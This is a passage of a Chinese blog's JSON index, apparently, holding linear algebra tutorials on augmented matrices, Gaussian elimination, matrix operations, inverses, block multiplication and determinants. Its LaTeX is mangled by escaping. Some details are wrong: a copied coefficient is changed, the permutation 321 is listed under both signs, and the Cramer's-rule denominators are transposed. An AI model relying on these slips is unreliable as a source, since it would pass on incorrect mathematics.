]称这个矩阵为方程组的增广矩阵。一般地,当一个$m\\times r$的矩阵 B 采用上述方法附加到一个$m \\times n$的矩阵 A 上,相应的增广矩阵记为$A \\mid B $。若$A=\\begin{bmatrix}{a{11}}&amp;{a{12}}&amp;{\\cdots}&amp;{a{1n}}\\{a{21}}&amp;{a{22}}&amp;{\\cdots}&amp;{a{2n}}\\{\\vdots}&amp;{\\vdots}&amp; &amp;{\\vdots}\\{a{m1}}&amp;{a{m2}}&amp;{\\cdots}&amp;{a{mn}}\\\\end{bmatrix},B= \\begin{bmatrix}{b{11}}&amp;{b{12}}&amp;{\\cdots}&amp;{b{1r}}\\{b{21}}&amp;{b{22}}&amp;{\\cdots}&amp;{b{2r}}\\{\\vdots}&amp;{\\vdots}&amp; &amp;{\\vdots}\\{b{m1}}&amp;{b{m2}}&amp;{\\cdots}&amp;{b{mr}}\\\\end{bmatrix}$则$(A\\mid B)=\\left [ \\begin {array} {ccc|ccc} {a{11}}&amp;{\\cdots}&amp;{a{1n}} &amp; {b{11}}&amp;{\\cdots}&amp;{a{1r}} \\ {\\vdots}&amp; \\ {a{m1}}&amp;{\\cdots}&amp;{a{mn}}&amp; {b{m1}}&amp;{\\cdots}&amp;{b{mn}} \\end {array}\\right ]$。对每一个方程组，均对应于一个增广矩阵，形如:$\\left[ \\begin {array} {ccc|c} {a{11}}&amp;{\\cdots}&amp;{a{1n}} &amp; {b1} \\ {\\vdots}&amp; &amp; &amp;{\\vdots}\\ {a{m1}}&amp;{\\cdots}&amp;{a_{mn}} &amp; {b_m} \\end {array}\\right]$。方程组的求解可以通过计算增广矩阵得到。用于得到等价方程组的三个运算,可对增广矩阵进行如下运算: 交换两行 以非 0 实数乘以某行 将某行替换为它与其他行的倍数的和 例 3 求解方程组 \\begin{cases} -x_2 - x_3 + x_4 = 0 \\\\ x_1 + x_2 + x_3 + x_4 = 6 \\\\ 2x_1 + 4x_2 + x_3 - 2x_4 = -1 \\\\ 3x_1 + x_2 - 2x_3 + 2x_4 = 3 \\end{cases}解：该方程组对应的增广矩阵为: \\left[ \\begin {array} {cccc|c} 0 & -1 & -1 & 1 & 0 \\\\ 1 & 1 & 1 & 1 & 6 \\\\ 2 & 4 & 1 & -2 & -1 \\\\ 3 & 1 & -2 & 2 & 3 \\end {array} \\right]交换第 1、2 行,得增广矩阵为: $$\\left[\\begin {array} {cccc|c}1 &amp; 1 &amp; 1 &amp; 1 &amp; 6 \\0 &amp; -1 &amp; -1 &amp; 1 &amp; 0 \\2 &amp; 4 &amp; 1 &amp; -2 &amp; -1 \\3 &amp; 1 &amp; -2 &amp; 2 &amp; 3\\end {array}\\right] 第 1 行都乘以-2,然后第 3 行加上去,同理第 1 行乘以-3，第 4 行加上去，得增广矩阵:\\left[\\begin {array} {cccc|c}1 &amp; 1 &amp; 1 &amp; 1 &amp; 6 \\0 &amp; -1 &amp; -1 &amp; 1 &amp; 0 \\0 &amp; 2 &amp; -1 &amp; -4 &amp; -13 \\0 &amp; -2 &amp; -5 &amp; -1 &amp; -15\\end {array}\\right] \\left[\\begin {array} {cccc|c}1 &amp; 1 &amp; 1 &amp; 1 &amp; 6 \\0 &amp; -1 &amp; -1 &amp; 1 &amp; 0 \\0 &amp; 0 &amp; -3 &amp; -2 &amp; -13 \\0 &amp; 0 &amp; 0 &amp; -1 &amp; -2\\end {array}\\right] 回代法求解即可得到方程组的解为:(2,-1,3,2)。 # 行阶梯形 ## 定义 ### 定义 若一个矩阵满足 1. 每一个非零行中的一个非零元为 1; 2. 第 k 行的元不全为零时,第 k+1 行首变量之前零的个数多于第 k 行首变量之前零的个数; 3. 所有元素均为零的行比在不全为零的行之后, 则称其为行阶梯型矩阵。 > - 例 4 > 下列矩阵前边 3 个为行阶梯型矩阵,第 4 个不是行阶梯型矩阵。 > \\begin{bmatrix} > 1 & 4 & 2 \\\\ > 0 & 1 & -6 \\\\ > 0 & 0 & 3 > \\end{bmatrix}, \\begin{bmatrix} 1 & 4 & 2 \\\\ 0 & 0 & -6 \\\\ 0 & 0 & 0 \\end{bmatrix}, \\begin{bmatrix} 1 & 4 & 2 & 0 \\\\ 0 & 0 & -6 & 6 \\\\ 0 & 0 & 0 & 0 \\end{bmatrix}, \\begin{bmatrix} 2 & 4 & 2 \\\\ 0 & 1 & -6 \\\\ 0 & 0 & 3 \\end{bmatrix} ### 定义 利用上述行运算将线性方程组的增广矩阵转化为行阶梯型增广矩阵称为高斯消元法。 ## 超定方程组 若一个线性方程组中方程的个数多于未知量的个数,则称其为超定的。超定方程组通常是(但不总是)不相容的。 > - 例 5 > 求方程组的解\\begin{cases}x_1 + 2x_2 + x_3 = 1 \\2x_1 - x_2 + x_3 = 2 \\4x_1 + 3x_2 + 3x_3 = 4 \\3x_1 + x_2 + 2x_3 = 3\\end{cases} 解:\\begin {array} {ccc|c} 1 &amp; 2 &amp; 1 &amp; 1 \\\\ 2 &amp; -2 &amp; 1 &amp; 2 \\\\ 4 &amp; 3 &amp; 3 &amp; 4 \\\\ 3 &amp; 1 &amp; 2 &amp; 3 \\end {array} \\right] \\longrightarrow \\left[\\begin {array} {ccc|c}1 &amp; 2 &amp; 1 &amp; 1 \\0 &amp; 1 &amp; \\frac{1}{5} &amp; 0 \\0 &amp; 0 &amp; 0 &amp; 0 \\0 &amp; 0 &amp; 0 &amp; 0\\end {array}\\right] \\begin{cases}x_2 = -0.2x_3 \\x_1 = 1-2x_2-x_3 = 1- 0.6x_3\\end{cases}$$。由此可得,方程组的解集为形如 $(1-0.6a,-0.2a,a)$ 的有序三元组集合,其中 a 为实数。由于存在自由变量$x_3$，所以方程组是相容的且有无穷多个解。 亚定方程组一个有 n 个未知量的 m 个线性方程的方程组,方程的个数少于未知量的个数(m &lt; n )称该方程组为亚定的。一个相容的亚定方程组通常有无穷多个解。 行最简形定义如果一个矩阵满足: 矩阵是行阶梯型的 每一行的第一个非零元是该列唯一的非零元，则称该矩阵是行最简形。 采用基本运算将矩阵转化为行最简形的过程称为高斯-诺尔当消元法。 齐次方程组如果方程组的右端项全为 0，则称其为齐次的。齐次方程组总是形容的。 矩阵运算矩阵记号如果我们要引入矩阵,而且又不需要列出矩阵的元素,则可以用大写字母 A、B、C…来表示。一般 $ a{ij}$表示矩阵的 i 行 j 列的元素，可以用(i,j)表示。一个$m \\times n$的矩阵可以表示为:$\\begin{bmatrix}{a{11}}&amp;{a{12}}&amp;{\\cdots}&amp;{a{1n}}\\{a{21}}&amp;{a{22}}&amp;{\\cdots}&amp;{a{2n}}\\{\\vdots}&amp;{\\vdots}&amp;{\\cdots}&amp;{\\vdots}\\{a{m1}}&amp;{a{m2}}&amp;{\\cdots}&amp;{a{mn}}\\end{bmatrix}$。有时矩阵可以简记为$A=(a_{ij})$。 向量由于仅有一行或一列的矩阵可以用来表示线性方程组的解。具有 m 个线性方程 n 个变量的线性方程组的解是一个实的 n 元组。我们以后称由实数组成的 n 元组为向量。如果将 n 元组表示为一个$ 1 \\times n $的矩阵，则称为行向量。此外,若将 n 元组表示为一个$ n \\times 1 $的矩阵，则称为列向量。例如,线性方程组$\\begin{cases}x_1 + x_2 = 3 \\x_1 - x_2 = 1\\end{cases}$ 的解可表示为行向量$ \\begin{bmatrix}2 &amp; 1\\end{bmatrix} $,或者列向量$ \\begin{bmatrix}{2}\\{1}\\end{bmatrix}$. 所有$n\\times 1$的实矩阵构成的集合称为 n 维欧几里得空间，通常记为$R_n$。一般大部分时间使用列向量,因此一般省略”列”字,并简称为$R_n$中的向量。列向量的标准记号采用黑斜体小写字母。为区分行向量和列向量,通常在行向量上加一水平箭头,如:$\\vec{x} = (x_1,x_2,x_3,x_4), y = \\begin{bmatrix}{y_1}\\{y_2}\\{y_3}\\{y_4}\\end{bmatrix}$,分别为有 4 项的行向量和列向量。 给定一个$ m\\times n$的矩阵 A,经常会使用它的特定行或列。A 的第 j 个列向量的标准记号为$aj$,第 i 个行向量通常没有标准记号,通常用水平箭头表示行向量，记为$\\vec{a_i}$。假设 A 为一个$m \\times n$的矩阵,则 A 的行向量表示为$\\vec{a_i}=(a{i1},a{i2},a{i3}…a{in}), i=1,2…n$,列向量表示为 $ a_j = \\begin{bmatrix}a{1j}\\a{2j}\\{\\vdots}\\a{mj}\\end{bmatrix} , j = 1,2…m $。 矩阵加法定义假设有两个$m\\times n$矩阵$A=(a{ij})$和$B=(b{ij})$,那么矩阵 A 和 B 的和记做 A+B,规定为$A+B = \\begin{bmatrix}{a{11}+b{11}} &amp; {a{12}+b{12}} &amp; {\\cdots} &amp; {a{1n}+b{1n}}\\{a{21}+b{21}} &amp; {a{22}+b{22}} &amp; {\\cdots} &amp; {a{2n}+b{2n}}\\{\\vdots} &amp; {\\vdots} &amp; {\\cdots} &amp; {\\vdots}\\{a{m1}+b{m1}} &amp; {a{m2}+b{m2}} &amp; {\\cdots} &amp; {a{mn}+b{mn}}\\\\end{bmatrix}$,需要注意的是只有两个矩阵是同型矩阵是才行进行加法运算。矩阵运算满足以下运算规律(设 A,B,C 为$m\\times n$的矩阵) A+B = B+A (A+B)+C = A+(B+C)设矩阵$A=(a{ij})$,记$ -A=(-a{ij})$,-A 称为矩阵 A 的负矩阵,显然有 A+(-A)=O,由此矩阵的减法为 A-B = A +(-B)。如果用 O 表示与 A 维数相同且元素全为 0 的矩阵，则 A+O=O+A=A,O 称为零矩阵。 数与矩阵相乘定义数$\\lambda$与矩阵 A 的乘积,记做$\\lambda A$或$ A\\lambda$,规定为$\\lambda A=A\\lambda = \\begin{bmatrix}{\\lambda a{11}} &amp; {\\lambda a{12}} &amp; {\\cdots} &amp; {\\lambda a{1n}}\\{\\lambda a{21}} &amp; {\\lambda a{22}} &amp; {\\cdots} &amp; {\\lambda a{2n}}\\{\\vdots} &amp; {\\vdots} &amp; {\\cdots} &amp; {\\vdots}\\{\\lambda a{m1}} &amp; {\\lambda a{m2}} &amp; {\\cdots} &amp; {\\lambda a_{mn}}\\\\end{bmatrix}$.矩阵的数乘满足以下运算规律(设 A,B 为$m\\times n$的矩阵,a,b 为数) (ab)A=a(bA) (a+b)A = aA+bA a(A+B) = aA+aB 矩阵相加与数乘矩阵合起来，统称为矩阵的线性运算。 矩阵与矩阵相乘定义设$A=(a{ij})$是一个$m\\times r$的矩阵,$B=(b{ij})$是一个$r\\times n$的矩阵，那么规定矩阵 A 和 B 的乘积是一个$m\\times n$的矩阵$C=(c{ij})$,其中$c{ij} = a{i1}b{1j} + a{i2}b{2j}+…+a{is}b{sj} = \\sum{k=1}^s a{ik}b_{kj},(i=1,2..m;j=1,2..n)$,将此乘积记做 C=AB。注意只有左矩阵的列数和右矩阵的行数相等,两个矩阵才能相乘。 矩阵的乘法不满足交换律，但是满足结合律和分配律: (AB)C=A(BC) a(AB)=(aA)B = A(aB) ,(a 为数字) A(B+C)=AB+AC 例 6$ A=\\begin{bmatrix}-3 &amp; 1 \\2 &amp; 5 \\4 &amp; 2 \\end{bmatrix},x=\\begin{bmatrix} 2\\ 4\\end{bmatrix},则 Ax = \\begin{bmatrix}-3 \\times 2 + 1 \\times 4 \\2 \\times 2 + 5 \\times 4\\4 \\times 2 + 2\\times 4\\end{bmatrix} = \\begin{bmatrix} -2\\24\\16\\end{bmatrix}$ 例 7线性方程组$ \\begin{cases}2x_1 + 3x_2 - 2x_3 = 5 \\5x_1 - 4x_2 + 2x_3 = 6\\end{cases},可以写成为矩阵方程 x_1\\begin{bmatrix}2\\5 \\end{bmatrix}+ x_2\\begin{bmatrix} {3} \\{-4} \\end{bmatrix}+ x_3\\begin{bmatrix} -2\\2 \\end{bmatrix} = \\begin{bmatrix}5\\6 \\end{bmatrix}$ 定义若$a_1,a_2…a_n为R^m中的向量,且c_1,c_2…c_n为标量,则和式c_1a_1+c_2a_2+…+c_na_n称为向量a_1,a_2…a_n的一个线性组合。$ 矩阵转置定义一个$m\\times n$的矩阵 A 的转置为$n\\times m$的矩阵 B,定义为$b{ji}=a{ij}$,其中 i=1,2…m;j=1,2..n。A 的转置记做$A^T$。 矩阵的转置也是一种运算，符合以下运算规律: $(A^T)^T=A$ $(A+B)^T=A^T+B^T$ $(aA)^T =aA^T$ $(AB)^T=B^TA^T $ 具体的证明可参考定义。 定义一个$n\\times n$的矩阵 A,若满足$A^T=A$,则称 A 为对称矩阵,简称对称阵。对称阵的特点是：它的元素以对角线为对称轴对应相等。 方阵的行列式定义由 n 阶方阵 A 的元素所构成的行列式(各元素位置不变),称为方阵 A 的行列式,记做$\\left| A \\right| 或detA$。 A 和$\\left| A \\right|$ 满足的以下运算规律(A,B 为 n 阶方阵,a 为数): $\\left| A^T \\right| = \\left| A \\right| $ $\\left| aA \\right| = a^n \\left| A \\right| $ $\\left| AB \\right| = \\left| A \\right| \\left| B \\right| $ 行列式$\\left| A \\right|$的各个元素的代数余子式$A{ij}$所构成的如下的矩阵$ A^{*} = \\begin{bmatrix}{A{11}}&amp;{A{12}}&amp;{\\cdots}&amp;{A{1n}}\\{A{21}}&amp;{A{22}}&amp;{\\cdots}&amp;{A{2n}}\\{\\vdots}&amp;{\\vdots}&amp;{\\cdots}&amp;{\\vdots}\\{A{n1}}&amp;{A{n2}}&amp;{\\cdots}&amp;{A{nn}}\\end{bmatrix}$,称为矩阵 A 的伴随矩阵,简称伴随阵。$A A^{*} =A^{*}A=\\left| A \\right|E $ 矩阵代数单位矩阵定义$n \\times n$的单位矩阵为矩阵 I = $(\\delta{ij})$,其中$\\delta{ij} = \\begin{cases}1, &amp; 当i=j \\0, &amp; 当 i \\not= j\\end{cases}$。 矩阵的逆任何非零的数 a 均有一个乘法逆元$b = \\frac {1}{a}$。可将此定义推广到矩阵。 定义若存在一个矩阵 B 使得 AB=BA=I,则称$n\\times n$矩阵 A 为非奇异的或可逆的。矩阵 B 称为 A 的乘法逆元。 一个矩阵最多有一个乘法逆元,我们把非奇异矩阵 A 的乘法逆元简称为 A 的逆,并记为$A^{-1}$。 例 8矩阵$ \\begin{bmatrix}2 &amp; 4 \\3 &amp; 1\\end{bmatrix} 和 \\begin{bmatrix}-\\frac{1}{10} &amp; \\frac{2}{5} \\\\frac{3}{10} &amp; -\\frac{1}{5}\\end{bmatrix} 互为逆元,因为\\begin{bmatrix}2 &amp; 4 \\3 &amp; 1\\end{bmatrix} \\begin{bmatrix}-\\frac{1}{10} &amp; \\frac{2}{5} \\\\frac{3}{10} &amp; -\\frac{1}{5}\\end{bmatrix} = \\begin{bmatrix}1 &amp; 0 \\0 &amp; 1\\end{bmatrix}$。 定义一个$n\\times n$的矩阵若不存在乘法逆元,则称为奇异的。注意： 只有方阵有乘法逆元。对于非方阵,不应该使用术语奇异或非奇异。 定理若 A 和 B 为非奇异的$n\\times n$矩阵，则 AB 也是非奇异的，且$(AB)^{-1} = B^{-1}A^{-1}$。 初等矩阵类型如果从单位矩阵 I 开始,只进行一次初等行运算,得到的矩阵为初等矩阵。分别对应于三类初等行运算,有三类初等矩阵。 类型 I第 I 类初等矩阵由交换 I 的两行得到。 类型 II第 II 类初等矩阵由单位矩阵 I 的某一行乘以一个非零常数得到。 类型 III第 III 类初等矩阵由矩阵 I 的某一行的倍数加到另一行得到。 定理若 E 为一初等矩阵,则 E 为非奇异的,且$E^{-1}$为一与它同类型的初等矩阵。 行等价定义若存在一个有限初等矩阵的序列$E1,E_2,…E_k,使得B=E_kE{k-1}…E_1A$,则称 A 与 B 为行等价的。 定理 (非奇异矩阵的等价条件)令 A 为一个$n\\times n$的矩阵,则下列命题是等价的: A 是非奇异的 Ax=0 仅有平凡解 0 A 与 I 行等价 对角矩阵和三角形矩阵一个$n\\times n$的矩阵 A,当$i\\ge j时,a{ij}=0 $,则称为上三角形的;当$i\\le j时,a{ij}=0 $,则称为下三角形的。如果 A 为上三角形的或下三角形的，又称为三角形的。 一个$n\\times n$的矩阵 A,当$i\\not=j时,a_{ij}=0 $,则称为对角的。 三角形分解如果一个$n\\times n$的矩阵 A 可以仅利用行运算 III 化简为严格的上三角形的，则可将化简过程用矩阵分解表示。 如果矩阵 L 为对角元素为 1 的下三角形矩阵。我们称 L 为单位下三角形矩阵。我们将一个矩阵 A 分解为一个单位下三角形矩阵和一个严格上三角形矩阵 U 的乘积的过程,通常称为 LU 分解。 分块矩阵通常，将矩阵看作由多个子矩阵复合而来。一个矩阵 C 可通过在其行中画一条横线，在其列中画一条竖线来分为较小的矩阵。这种较小的矩阵称为块。例如,矩阵$C=\\begin{bmatrix}2 &amp; 4 &amp; 2 &amp; 1 &amp; 5 \\0 &amp; 1 &amp; -6 &amp; 1 &amp; 5 \\0 &amp; 0 &amp; 3 &amp; 1 &amp; 5 \\4 &amp; 2 &amp; 1 &amp; 4 &amp; 2\\end{bmatrix} $,在第二行、第三行之间画一条横线,第三列、四列之间画一条竖线，则矩阵 C 被划分为四个子矩阵$C{11},C{12},C{21},C{22}$。$\\begin{bmatrix}{C{11}} &amp; {C{12}} \\{C{21}} &amp; {C{22}}\\end{bmatrix}= \\left[ \\begin {array} {ccc|cc} 2 &amp; 4 &amp; 2 &amp; 1 &amp; 5 \\ 0 &amp; 1 &amp; -6 &amp; 1 &amp; 5 \\ \\hline \\ 0 &amp; 0 &amp; 3 &amp; 1 &amp; 5 \\ 4 &amp; 2 &amp; 1 &amp; 4 &amp; 2 \\end {array}\\right]$。 按列分块一种有用的方法是将矩阵按列分块。设$B=\\begin{bmatrix}1 &amp; 3 &amp; 5 \\2 &amp; 4 &amp; 7 \\3 &amp; 1 &amp; 9\\end{bmatrix}$,可将 B 划分为三个列子矩阵: $B=(b_1,b_2,b_3)=\\left[ \\begin {array} {c|c|c} 1 &amp; 3 &amp; 5 \\ 2 &amp; 4 &amp; 7 \\ 3 &amp; 1 &amp; 9 \\end {array}\\right]$。 假设我们给定一个有三列的矩阵 A,则乘积 AB 可以看成一个分块乘法,矩阵 B 的每一块均乘以 A，并且结果矩阵也有三块,即:$Ab_1,Ab_2,Ab_3$；也就是说$AB=A(b_1,b_2,b_3) =(Ab_1,Ab_2,Ab_3) $。 例如,若:$A=\\begin{bmatrix}1 &amp; 3 &amp; 1 \\2 &amp; 4 &amp; 7\\end{bmatrix},Ab_1=\\begin{bmatrix}3 \\5\\end{bmatrix},Ab_2=\\begin{bmatrix}5 \\-1\\end{bmatrix},Ab_3=\\begin{bmatrix}10 \\-4\\end{bmatrix},因此 A(b_1,b_2,b_3) = \\left[ \\begin {array} {c|c|c} 3 &amp; 5 &amp; 10 \\ 5 &amp; -1 &amp; -4 \\end {array}\\right]$。 一般地，如果 A 为一个$m\\times n$的矩阵,而 B 为一个按列划分的$n\\times r$的矩阵(b_1,b_2…b_r)$,那么A乘B的分块乘法由下式给出:$AB=(Ab_1,Ab_2,…,Ab_r)$。 按行分块令 A 为一个$n\\times r$矩阵,乘积 AB 的第 i 行是由 A 的第 i 行乘以 B 得到的。因此，AB 的第 i 行为$\\vec{a_i}B$。一般地，乘积 AB 可以写成如下的分块行的形式:$AB= \\begin{bmatrix}{\\vec{a_1} B} \\{\\vec{a_2} B} \\{\\vdots} \\{\\vec{a_m} B }\\end{bmatrix}$。设$A=\\begin{bmatrix}2 &amp; 5 \\3 &amp; 4\\1 &amp; 7\\end{bmatrix},B=\\begin{bmatrix}3 &amp; 2 &amp; -3 \\-1 &amp; 1 &amp; 1\\end{bmatrix}。则\\vec{a_1}B=\\begin{bmatrix}1 &amp; 9 &amp; -1\\end{bmatrix},\\vec{a_2}B=\\begin{bmatrix}5 &amp; 10 &amp; -5\\end{bmatrix},\\vec{a_1}B=\\begin{bmatrix}-4 &amp; 9 &amp; 4\\end{bmatrix}$，这就是 AB 乘积的行向量。$AB=\\begin{bmatrix}{\\vec{a_1} B} \\{\\vec{a_2} B} \\{\\vec{a_3} B }\\end{bmatrix} = \\left[ \\begin {array} 1 &amp; 9 &amp; -1 \\ \\hline 5 &amp; 10 &amp; -5 \\ \\hline -4 &amp; 9 &amp; 4 \\end {array}\\right]$。 下面考虑用一般的分块来计算矩阵 A、B 的乘积 AB. 情形 1$B=\\begin{bmatrix}B1 &amp; B_2\\end{bmatrix},其中B_1为一个n\\times t矩阵,且B_2为一个n\\times(r-t)的矩阵。$$\\begin{align}AB &amp; = A(b_1,b_2,…,b_t,b{t+1},…br) \\&amp; = (Ab_1,Ab_2,…,Ab_t,Ab{t+1},…Abr) \\&amp; = (A(b_1,Ab_2,…,Ab_t),A(b{t+1},…Ab_r)) \\&amp; =\\begin{bmatrix}AB_1 &amp; AB_2\\end{bmatrix}\\end{align},$因此$A\\begin{bmatrix}B_1 &amp; B_2\\end{bmatrix}=\\begin{bmatrix}AB_1 &amp; AB_2\\end{bmatrix} $ 情形 2 情形 3 情形 4 参考资料 矩阵 增广矩阵(Augmented_matrix) 同济线性代数第五版 线性代数 Steven J Leon(原书第 8 版)","updated":"2020-07-19T00:23:28.003Z","tags":[{"name":"线代","slug":"线代","permalink":"http://xwolf191.github.io/tags/线代/"}]},{"title":"线性代数一之行列式","date":"2018-07-12T14:30:00.000Z","path":"2018/07/12/数学/线性代数一之行列式/","text":"行列式（Determinant）是数学中的一个函数，将一个n \\times n的矩阵A映射到一个标量，记作 det(A)或 |A|。行列式可以看做是有向面积或体积的概念在一般的欧几里得空间中的推广。或者说，在 n 维欧几里得空间中，行列式描述的是一个线性变换对“体积”所造成的影响。无论是在线性代数、多项式理论，还是在微积分学中（比如说换元积分法中），行列式作为基本的数学工具，都有着重要的应用。 行列式概念最早出现在解线性方程组的过程中。十七世纪晚期，关孝和与莱布尼茨的著作中已经使用行列式来确定线性方程组解的个数以及形式。十八世纪开始，行列式开始作为独立的数学概念被研究。十九世纪以后，行列式理论进一步得到发展和完善。矩阵概念的引入使得更多有关行列式的性质被发现，行列式在许多领域都逐渐显现出重要的意义和作用，出现线性自同态和向量组的行列式的定义。 行列式的特性可以被概括为一个交替多线性形式，这个本质使得行列式在欧几里德空间中可以成为描述“体积”的函数。 — wiki 二阶与三阶行列式解方程组 \\begin{cases} a_{11}x_1+a_{12}x_2=b_1 \\\\ a_{21}x_1+a_{22}x_2=b_2 \\end{cases}消元法解方程后: x_1 = \\frac {b_1a_{22}-a_{12}b_2 }{a_{11}a_{22}-a_{12}a_{21} } x_2 = \\frac {b_2a_{11}-a_{21}b_1 }{a_{11}a_{22}-a_{12}a_{21} }方程组的系数可以用二行二列的数表表示： \\begin{matrix} a_{11} & a_{12} \\\\ a_{21} & a_{22} \\end{matrix}表达式 $ a{11}a{22}-a{12}a{21} $ 称为数表的二阶行列式,用$ \\begin{vmatrix}a{11} &amp; a{12} \\a{21} &amp; a{22}\\end{vmatrix} $ 表示。数$a{ij}$ 称为行列式的元素。i,j表示i行j列的元素。二阶行列式的定义可用对角线法则记忆, $a{11}a{22}$的连线称为主对角线, $a{12}a{21}$的连线称为副对角线。二阶行列式的结果为主对角线积和副对角线积的差。则$b_1a{22}-a{12}b_2 = \\begin{vmatrix}b_1 &amp; a{12} \\b2 &amp; a{22}\\end{vmatrix}$$b2a{11}-a{21}b_1 = \\begin{vmatrix}a{11} &amp; b1 \\a{21} &amp; b_2\\end{vmatrix}$ 则方程的解为: x_1 = \\frac { \\begin{vmatrix} b_1 & a_{12} \\\\ b_2 & a_{22} \\end{vmatrix} }{ \\begin{vmatrix} a_{11} & a_{21} \\\\ a_{12} & a_{22} \\end{vmatrix} } x_2 = \\frac { \\begin{vmatrix} a_{11} & b_1 \\\\ a_{21} & b_2 \\end{vmatrix} }{ \\begin{vmatrix} a_{11} & a_{21} \\\\ a_{12} & a_{22} \\end{vmatrix} }套用以上系数,可用行列式来求解二元一次方程。 三阶行列式 定义 设有9个数排成3行3列的数表$\\begin{matrix}a{11} &amp; a{12} &amp; a{13} \\a{21} &amp; a{22} &amp; a{23} \\a{31} &amp; a{32} &amp; a{33}\\end{matrix},表示为三阶行列式\\begin{vmatrix}a{11} &amp; a{12} &amp; a{13} \\a{21} &amp; a{22} &amp; a{23} \\a{31} &amp; a{32} &amp; a{33}\\end{vmatrix} = a{11}a{22}a{33}+a{12}a{23}a{31} +a{21}a{32}a{13} - a{13}a{22}a{31}-a{11}a{32}a{23}-a{12}a{21}a{33}$ 。 也是对角线法则来计算三阶行列式的值。 全排列及其逆序数 排列 先来看个例子:1,2,3三个数字能组成多少个没有重复数字的三位数？ 答案很简单,第一位数字有3种情况,第二位数字有2种,第三位有1种。则总的数字为：3$\\times$ 2 $\\times$ 1 = 6 个。分别为: 123,132,213,231,312,321 。上例可引出这样的问题: n个不同的元素排成一列,共有几种排法？把n个不同的元素排成一列,叫做这n个元素的全排列(简称排列)。n个元素所有不同的排列数通常用$P_n$表示,例子中可以用$P_3=3\\times 2 \\times 1 = 6 $ 。则$P_n = n.(n-1).(n-2)…3.2.1 = n!$ 逆序数 在一个排列中，如果一对数的前后位置与大小顺序相反，即前面的数大于后面的数，那么它们就称为一个逆序。一个排列中逆序的总数就称为这个排列的逆序数。一个排列中所有逆序总数叫做这个排列的逆序数。也就是说，对于n个不同的元素，先规定各元素之间有一个标准次序（例如n个 不同的自然数，可规定从小到大为标准次序），于是在这n个元素的任一排列中，当某两个元素的先后次序与标准次序不同时，就说有1个逆序。一个排列中所有逆序总数叫做这个排列的逆序数。 逆序数为偶数的排列称为偶排列；逆序数为奇数的排列称为奇排列。 如2431中，21，43，41，31是逆序，逆序数是4，为偶排列。 求排列32514的逆序数。解：3的逆序数有0个;2的逆序数有1个,为3;5的逆序数有0个;1的逆序数有3个,为3,2,5;4的逆序数有1个,为5;故这个排列的逆序数为t=1+3+1=5。5为奇数,这个排列为奇排列。 n阶行列式 先看上边关于三阶行列式的定义,$\\begin{vmatrix}a{11} &amp; a{12} &amp; a{13} \\a{21} &amp; a{22} &amp; a{23} \\a{31} &amp; a{32} &amp; a{33}\\end{vmatrix} = a{11}a{22}a{33}+a{12}a{23}a{31} +a{21}a{32}a{13} - a{13}a{22}a{31}-a{11}a{32}a{23}-a{12}a{21}a{33}$ ,容易看出等式后边都是三个行、列元素的积。每一个元素可以用$a{1p1}a{2p2}a{3p_3}$的形式表示。第一个下标(行标)为123,而第二个下标(列标)$p_1p_2p_3$为1,2,3这三个数字的某一个排列。其中带正号的列标排列为123,321,312;带负号的列标排列为132,213,321。经计算,前三个排列为偶排列,后边排列为奇排列。因此,各项所带正负号可以表示为 $(-1)^t$,其中t为排列的逆序数。三阶行列式可以写成: \\begin{vmatrix} a_{11} & a_{12} & a_{13} \\\\ a_{21} & a_{22} & a_{23} \\\\ a_{31} & a_{32} & a_{33} \\end{vmatrix} = \\sum (-1)^ta_{1p_1}a_{2p_2}a_{3p_3}把此种形式可以推广到$n^2$个数表, 定义 设有$n^2$个数,排成n行n列的数表, \\begin{matrix} {a_{11}}&{a_{12}}&{\\cdots}&{a_{1n}}\\\\ {a_{21}}&{a_{22}}&{\\cdots}&{a_{2n}}\\\\ {\\vdots}&{\\vdots}& &{\\vdots}\\\\ {a_{n1}}&{a_{n2}}&{\\cdots}&{a_{nn}}\\\\ \\end{matrix},得到形如$(-1)^ta{1p_1}a{2p2}a{3p3}…a{npn}$的项,$a{1p1}a{2p2}a{3p3}…a{np_n}$ 为自然数1,2…n的一个排列，t为这个排列的逆序数。这样的排列共有n!个，因而形如上述的项共有n!项。所有这n!项的代数和为 \\sum (-1)^ta_{1p_1}a_{2p_2}a_{3p_3}...a_{np_n}称为n阶行列式,记作: \\begin{vmatrix} {a_{11}}&{a_{12}}&{\\cdots}&{a_{1n}}\\\\ {a_{21}}&{a_{22}}&{\\cdots}&{a_{2n}}\\\\ {\\vdots}&{\\vdots}& &{\\vdots}\\\\ {a_{n1}}&{a_{n2}}&{\\cdots}&{a_{nn}}\\\\ \\end{vmatrix},简记为$det(a{ij})$,其中数$a{ij}$为行列式D的(i,j)元。 对换 在排列中,将任意两个元素对调,其他元素不动。这种做出新排列的手续叫对换。将相邻的两个元素对换称为相邻对换。 定理1 一个排列中的任意两个元素对换,排列改变奇偶性。 定理2 n阶行列式也可以定义为 $ D=\\sum (-1)^ta{p_11}a{p22}a{p33}…a{p_nn} $ ,其中t为$p_1p_2…p_n$的逆序数。 行列式性质 记 D = \\begin{vmatrix} {a_{11}}&{a_{12}}&{\\cdots}&{a_{1n}}\\\\ {a_{21}}&{a_{22}}&{\\cdots}&{a_{2n}}\\\\ {\\vdots}&{\\vdots}& &{\\vdots}\\\\ {a_{n1}}&{a_{n2}}&{\\cdots}&{a_{nn}}\\\\ \\end{vmatrix} , D_T = \\begin{vmatrix} {a_{11}}&{a_{21}}&{\\cdots}&{a_{n1}}\\\\ {a_{12}}&{a_{22}}&{\\cdots}&{a_{n2}}\\\\ {\\vdots}&{\\vdots}& &{\\vdots}\\\\ {a_{1n}}&{a_{2n}}&{\\cdots}&{a_{nn}}\\\\ \\end{vmatrix}行列式$D_T$称为行列式D的转置行列式。 性质1 行列式和它的转置行列式相等。 性质2 互换行列式的两行(列),行列式变号。 推论 如果行列式有两行(列)完全相同,行列式值等于0。 性质3 行列式中的某一行(列)中所有的元素都乘以一个数k,等于用数k乘以此行列式。 推论 行列式中的某一行(列)中所有元素的公因子可以提到行列式记号的外面。 性质4 如果行列式如果有两行(列)元素成比例,行列式值等于0。 性质5 若行列式的某一列(行)的元素都是两数之和,例如第i列的元素都是两数之和：$D = \\begin{vmatrix}{a{11}}&amp;{a{21}}&amp;{\\cdots}&amp; (a{1i}+a’{1i}) &amp;{\\cdots}&amp; {a{n1}}\\{a{12}}&amp;{a{22}}&amp;{\\cdots}&amp;(a{2i}+a’{2i}) &amp;{\\cdots} &amp;{a{n2}}\\{\\vdots}&amp;{\\vdots}&amp; &amp;{\\vdots} &amp; &amp; {\\vdots}\\{a{1n}}&amp;{a{2n}}&amp;{\\cdots}&amp;(a{ni}+a’{ni}) 